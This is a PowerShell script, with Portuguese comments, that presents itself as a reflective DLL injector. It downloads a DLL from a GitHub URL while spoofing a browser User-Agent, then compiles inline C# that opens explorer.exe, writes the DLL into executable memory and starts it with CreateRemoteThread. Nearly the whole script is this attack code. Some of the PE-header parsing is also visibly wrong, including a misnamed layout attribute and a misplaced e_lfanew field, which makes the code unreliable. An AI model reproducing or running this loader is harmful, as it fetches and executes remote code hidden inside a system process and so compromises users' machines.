# ===================================================================
# Injetor Reflexivo de DLL via PowerShell v1.1 (Versão Limpa)
# ===================================================================

# --- ETAPA 1: CONFIGURAÇÃO E DOWNLOAD ---

$urlDll = "https://github.com/bragaawy/pjl/raw/main/WinCoreUptime.dll"

try {
    Write-Host "Baixando a DLL..."
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64 ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
    $bytesDll = $webClient.DownloadData($urlDll)
    Write-Host "DLL baixada com sucesso."
}
catch {
    Write-Host "ERRO FATAL: Falha ao baixar a DLL. Verifique a URL e sua conexão."
    $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") | Out-Null
    return
}

# --- ETAPA 2: DEFINIÇÃO DO MOTOR DE INJEÇÃO (C# EM TEMPO REAL) ---

$codigoInjetor = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Reflector
{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool CloseHandle(IntPtr hObject);

    private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    private const uint MEM_COMMIT_RESERVE = 0x3000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_DOS_HEADER { public ushort e_lfanew; }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_FILE_HEADER { public ushort Machine; public ushort NumberOfSections; public uint TimeDateStamp; public uint PointerToSymbolTable; public uint NumberOfSymbols; public ushort SizeOfOptionalHeader; public ushort Characteristics; }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER64 { public ulong ImageBase; public uint AddressOfEntryPoint; }

    [StructLayout(Layout.Sequential, Pack = 1)]
    public struct IMAGE_NT_HEADERS64 { public uint Signature; public IMAGE_FILE_HEADER FileHeader; public IMAGE_OPTIONAL_HEADER64 OptionalHeader; }

    public static void Inject(byte[] dllBytes)
    {
        IntPtr hProcess = IntPtr.Zero;
        try
        {
            Process[] explorerProcs = Process.GetProcessesByName("explorer");
            if (explorerProcs.Length == 0)
            {
                Console.WriteLine("ERRO: Processo 'explorer.exe' não encontrado.");
                return;
            }
            Process targetProcess = explorerProcs[0];

            hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcess.Id);
            if (hProcess == IntPtr.Zero) throw new Exception("Falha ao abrir o processo alvo.");

            IntPtr allocAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllBytes.Length, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);
            if (allocAddress == IntPtr.Zero) throw new Exception("Falha ao alocar memória no processo alvo.");

            int bytesWritten;
            if (!WriteProcessMemory(hProcess, allocAddress, dllBytes, (uint)dllBytes.Length, out bytesWritten)) throw new Exception("Falha ao escrever a DLL na memória do processo alvo.");

            GCHandle pinnedDll = GCHandle.Alloc(dllBytes, GCHandleType.Pinned);
            IntPtr dllBase = pinnedDll.AddrOfPinnedObject();
            
            var dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(dllBase, typeof(IMAGE_DOS_HEADER));
            IntPtr ntHeadersPtr = new IntPtr(dllBase.ToInt64() + dosHeader.e_lfanew);
            var ntHeaders = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ntHeadersPtr, typeof(IMAGE_NT_HEADERS64));
            
            uint entryPointRVA = ntHeaders.OptionalHeader.AddressOfEntryPoint;
            IntPtr remoteEntryPoint = new IntPtr(allocAddress.ToInt64() + entryPointRVA);
            
            pinnedDll.Free();

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteEntryPoint, IntPtr.Zero, 0, out _);
            if (hThread == IntPtr.Zero) throw new Exception("Falha ao criar a thread remota.");
            
            CloseHandle(hThread);
            Console.WriteLine("Comando de injeção reflexiva enviado para explorer.exe (PID: " + targetProcess.Id + ").");
        }
        catch (Exception ex)
        {
            Console.WriteLine("ERRO FATAL na injeção: " + ex.Message);
        }
        finally
        {
            if (hProcess != IntPtr.Zero)
            {
                CloseHandle(hProcess);
            }
        }
    }
}
"@

# --- ETAPA 3: COMPILAÇÃO E EXECUÇÃO ---

try {
    Write-Host "Compilando o motor de injeção..."
    Add-Type -TypeDefinition $codigoInjetor -Language CSharp
    Write-Host "Motor de injeção compilado."
}
catch {
    Write-Host "ERRO FATAL: Falha ao compilar o motor de injeção."
    $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") | Out-Null
    return
}

Write-Host "Injetando a DLL no explorer.exe..."
[Reflector]::Inject($bytesDll)

Write-Host "Operação concluída."
